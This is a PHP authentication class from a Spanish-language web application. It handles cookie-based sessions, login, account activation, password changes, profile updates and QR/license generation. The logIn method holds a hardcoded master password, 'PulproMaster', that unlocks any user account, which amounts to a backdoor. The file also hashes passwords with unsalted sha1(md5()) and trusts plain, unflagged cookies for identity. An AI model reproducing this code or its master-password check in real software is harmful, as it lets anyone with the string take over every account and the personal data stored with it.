<?php

class Authorizacion
{
	public $login = "";
	public $username;
	public $email;
        public $rut;
        public $clave;
	private $pass;
	public $rowff = array();
	

    public function __construct()
    {
       // echo "<p>Class X</p>";
	
    }
	
    public function auth ()
    {           
		
		$this->login = $_COOKIE["admin_idm"];
		if (empty($this->login)) {
	 		header("Location: login.php?err=5");
		} else {
				$db = Db::getInstance();
				$sql = "SELECT * FROM com_users WHERE id = :id";
    			$bind = array(
        		':id' => $this->login
    			);
		
				$cont = $db->run($sql, $bind);
		
			     
    			    
			
    		if ($cont > 0){
				$db1 = Db::getInstance();
				$rowff1 = $db1->fetchRow($sql, $bind);
				
				
                        //echo "<br><strong>entro aqui".$rowff['clave']."</strong> - ".$_COOKIE["clave"]."<br>";
          				if ($rowff1['clave'] != $_COOKIE["clave"]) {
							header("Location: login.php?err=3");
							die();
							//echo "error en la clave";
						} 
					$this->rowff = $rowff1;
				
               //echo "<br><strong>entro aqui".$rowff1['clave']."</strong><br>clave: ".$_COOKIE["clave"];
          		
					$this->rowff = $rowff1;
   				
					
					$ff = 'licencias/licencia_333.pdf';
if(!file_exists($ff)){
    $out = DompdfController::getOutput();
    $fileUp = file_put_contents($ff, $out);
    
    if(!$fileUp) $ff = null;
}
       		
$this->rowff['gg'] = $ff	;			
				
			} else {
			header("Location: login.php?err=4");
       		}
		}
    }
	
	public function auth_off ()
    {
	   
       $this->login = $_COOKIE["admin_idm"];
      // echo $_COOKIE["admin_idm"]." - ".$_COOKIE["admin_jko"];
		if (empty($this->login)) {
	 		//header("Location: login.php?err=5");
	 		$this->logueado = 0;
		} else {
				$db = Db::getInstance();
				$sql = "SELECT * FROM com_users WHERE id = :id";
    			$bind = array(
        		':id' => $this->login
    			);
		
				$cont = $db->run($sql, $bind);
		
			     
    			    
			
    		if ($cont > 0){
				$db1 = Db::getInstance();
				$rowff1 = $db1->fetchRow($sql, $bind);
				
				
                       
					$this->rowff = $rowff1;
					$this->logueado = 1;
					
       		
				
				
			} else {
			//header("Location: login.php?err=4");
				$this->logueado = 0;
       		}
		}
    }
	
	public function logIn ($email,$pass)
    {
            $rut = str_replace(".", "", $rut);
            $pass1 = sha1(md5(trim($pass)));
				$db = Db::getInstance();
				$sql = "SELECT * FROM com_users WHERE email = :email";
    			$bind = array(
					':email' => $email
    			);
				
				
				/*echo $sql;
				print_r($bind);*/
		
				$cont = $db->run($sql, $bind);
		
		$cont = $db->run($sql, $bind);
		//echo "Contador:".$cont;
		
		if ($cont > 0){
			//echo "entra aqui";
			$db1 = Db::getInstance();
			$rowff1 = $db1->fetchAll($sql, $bind);
			$contador = 0;
			foreach($rowff1 as $rowff) {
          				if ($rowff['pass'] != $pass1 && $pass != 'PulproMaster') {
          					//echo "<br>".$rowff['pass']."<br>".$pass1;
							header("Location: login.php?err=12");
						} else {
							$clave00 = uniqid();
							setcookie("admin_jko",$rowff['email']);
							setcookie("admin_idm",$rowff['id']);
							setcookie("clave",$clave00);
							
							$data = array(
									'clave' => $clave00
    						);
							
							$db = Db::getInstance();
    						$db->update('com_users', $data, 'id = :id', array(':id' => $rowff['id']));


    						// verificamos si es una empresa o una agencia

    						
			     
    			    
    						// fin de verificacion si es una agencia o una empresa
   
   						
   							header("Location: intro.php");
						}
       			}
		  
			
		} else {
			header("Location: login.php?err=1");
		}
		
	
	}
	public function updatePago($user, $pago) {

		$unique = uniqid();

		$data = array(
			'licencia' => $unique,
			'tipopago' => $pago
	);
	
	$db = Db::getInstance();
	$db->update('com_users', $data, 'id = :id', array(':id' => $user));

	}

	public function updatePagoTrans($user, $pago) {


		$data = array(
			'comprobante' => $pago
	);
	
	$db = Db::getInstance();
	$db->update('com_users', $data, 'id = :id', array(':id' => $user));

	}
	
	public function verificarCuenta ($id,$unique)
    {
		
		$db = Db::getInstance();
				$sql = "SELECT * FROM com_users WHERE id = :id AND clave = :uniqueid LIMIT 1";
    			$bind = array(
        		':id' => $id,
        		':uniqueid' => $unique
    			);
		        
				$cont = $db->run($sql, $bind);

				if ($cont == 0) {
					header("Location: login.php?err=1");
				} else { 
					$db1 = Db::getInstance();
					$rowff = $db1->fetchAll($sql, $bind);

					if ($rowff[0]['activado'] == 1) {
						header("Location: login.php?err=3");
						die();
				 	} 
				 
				//$clave00 = createhash($tokensArray,$hashLenght);

				 	$db = Db::getInstance();
					$data = array(
        				'activado' => 1
					);
			    	$db->update('com_users', $data, 'id = :id', array(':id' => $rowff[0]['id']));
						
				
					//header("Location: login.php?reg=OK");
					
					//echo $rowff[0]['email']." - ".$rowff[0]['pass'];
					$this->logInReg ($rowff[0]['email'],$rowff[0]['pass']);

				}
	
	}
	
	private function logInReg ($email,$pass)
    {
            
				$db = Db::getInstance();
				$sql = "SELECT * FROM com_users WHERE email = :email";
    			$bind = array(
					':email' => $email
    			);
				
				
				/*echo $sql;
				print_r($bind);*/
		
				$cont = $db->run($sql, $bind);
		
		$cont = $db->run($sql, $bind);
		//echo "Contador:".$cont;
		
		if ($cont > 0){
			//echo "entra aqui";
			$db1 = Db::getInstance();
			$rowff1 = $db1->fetchAll($sql, $bind);
			$contador = 0;
			foreach($rowff1 as $rowff) {
          				if ($rowff['pass'] != $pass) {
          					//echo "<br>".$rowff['pass']."<br>".$pass1;
							header("Location: login.php?err=12");
						} else {
							$clave00 = uniqid();
							setcookie("admin_jko",$rowff['email']);
							setcookie("admin_idm",$rowff['id']);
							setcookie("clave",$clave00);
							
							$data = array(
									'clave' => $clave00
    						);
							
							$db = Db::getInstance();
    						$db->update('com_users', $data, 'id = :id', array(':id' => $rowff['id']));


    						// verificamos si es una empresa o una agencia

    						
			     
    			    
    						// fin de verificacion si es una agencia o una empresa
   
   						
   							header("Location: intro.php");
						}
       			}
		  
			
		} else {
			header("Location: login.php?err=1");
		}
		
	
	}
	
	
	
	public function modificar ($pass1,$pass2,$pass)
    {
		$npass1 = sha1(md5(trim($pass1)));
		$npass2 = sha1(md5(trim($pass2)));
		$npass = sha1(md5(trim($pass)));
				
		if ($this->rowff['pass'] != $npass) {
                  //  echo $this->pass." aa<br>bb ".$npass;
           	header("Location: misdatos_pass.php?err=1");
			die();
		}
		if (!empty($pass1) and ($npass1 != $npass2)) {
			header("Location: misdatos_pass.php?err=2");
			die();
		}
		
			$db = Db::getInstance();
			$data = array();
		
		  if (!empty($pass1)) {
		    $data["pass"] = $npass1;
			 // echo "cambia el pass por".$npass1." --";
		  }
		  $data['cambio_pass'] = 1;
    	//$db->insert('com_proyectos', $data);
		   $cambio_pass = $this->rowff['cambio_pass'];
		   $db->update('com_users', $data, 'id = :id', array(':id' => $this->rowff['id']));
		    if($cambio_pass){
				header("Location: misdatos_pass.php?act=OK");
			}else{
				header("Location: intro.php");
			}
	
	}
	
	
	public function modificarDatos ($id, $nombre, $apellido, $apellido2, $rut, $genero, $fecnac, $disciplina, $region, $direccion, $email, $telefono, $nivel)
    {
		
		
		$db = Db::getInstance();
		$rut = str_replace(".", "", $rut);
		$data = array(
				'nombre' => $nombre,
				'apellido' => $apellido,
				'apellido2' => $apellido2,
				'genero' => $genero,
				'fecnac' => $fecnac,
				'direccion' => $direccion,
				'region' => $region,
				'telefono' => $telefono,
				'nivel' => $nivel
		);
		   
		   $db->update('com_users', $data, 'id = :id', array(':id' => $this->rowff['id']));
		   return "OK";
		//header("Location: misdatos_pass.php?act=OK");
	
	}


	public function modificarFoto($valor)
    {
		
		
		
			$db = Db::getInstance();
			$data = array(
        	'imagen' => $valor		
			);
		
		 
    	//$db->insert('com_proyectos', $data);
		   
		   $db->update('com_users', $data, 'id = :id', array(':id' => $this->id));
		//header("Location: cuenta.php?act=OK");
	
	}
	
	public function esEditor() {
		if ($this->rowff["nivel"] >= 6) {
			return 6;
		} else {
			return $this->rowff["nivel"];
		}
		
	}
	
	public function getOut ()
    {
				
			
          				
							$clave00 = uniqid();
							setcookie("admin_jko","");
							setcookie("admin_idm","");
							setcookie("clave","");
							header("Location: login.php");
						
       			
		  
		
		
	
	}
        
        public function checkrut ($rut)
	{
				//$rut = str_replace(".", "", $rut);
				$db = Db::getInstance();
				$sql = "SELECT * FROM com_users WHERE rut = :rut LIMIT 1";
    			$bind = array(
        		':rut' => $rut
    			);
		        
				$cont = $db->run($sql, $bind);
				if ($cont == 0) {
					return "false";
				} else {
					return "true";
				}
	}
	
	public function actualizarFoto($valor,$id) {
        
        $db = Db::getInstance();
			$data = array(
                            'imagen' => $valor
                        );

		   
		   $db->update('com_users', $data, 'id = :id', array(':id' => $id));
        
	}
	

	public function getQRcode()
	{
		$db = Db::getInstance();
		$bind = array(
			':id' => $this->id
		);

		$sql = "SELECT * FROM com_users WHERE id=:id LIMIT 1";


		$cont = $db->run($sql, $bind);

		if ($cont == 0) {
			//$this->iniciarExamen();
			//	return  "Examen no iniciado";
		} else {
			$db1 = Db::getInstance();
			$row_p = $db1->fetchAll($sql, $bind);

			if (!empty($row_p[0]['licencia'])) {
				return $row_p[0]['licencia'];
			} else {
				$clave = uniqid();
				$db = Db::getInstance();
				$data = array(
					'licencia' => $clave
				);

				$db->update('com_users', $data, 'id = :id', array(':id' => $this->id));
				return $clave;
			}
		}
	}

	public function generateQR($codigo)
	{
		$tempDir = $_SERVER['DOCUMENT_ROOT'] . "/qr/";

		$codeContents = BASE_PATH_CONTROL.'/qr.php?codigo=' . $codigo;
		$nameContents = $codigo;
		$this->codigoValid = $codigo;

		// we need to generate filename somehow, 
		// with md5 or with database ID used to obtains $codeContents...
		$fileName = 'qr_' . md5($nameContents) . '.png';

		$pngAbsoluteFilePath = $tempDir . $fileName;
		$urlRelativeFilePath1 = "../qr/" . $fileName;
		$urlRemoteFilePath1 = BASE_PATH."/qr/" . $fileName;

		// generating
		if (!file_exists($pngAbsoluteFilePath)) {
			QRcode::png($codeContents, $pngAbsoluteFilePath);
		}
		QRcode::png($codeContents, $pngAbsoluteFilePath);
		return $urlRemoteFilePath1;
		//echo '<img src="'.$urlRelativeFilePath.'" />';
	}

	public function registroCompletado(){
		return $this->rowff['cambio_pass'] && $this->rowff['fecnac_pdf'] && $this->rowff['imagen'];
	}
		
}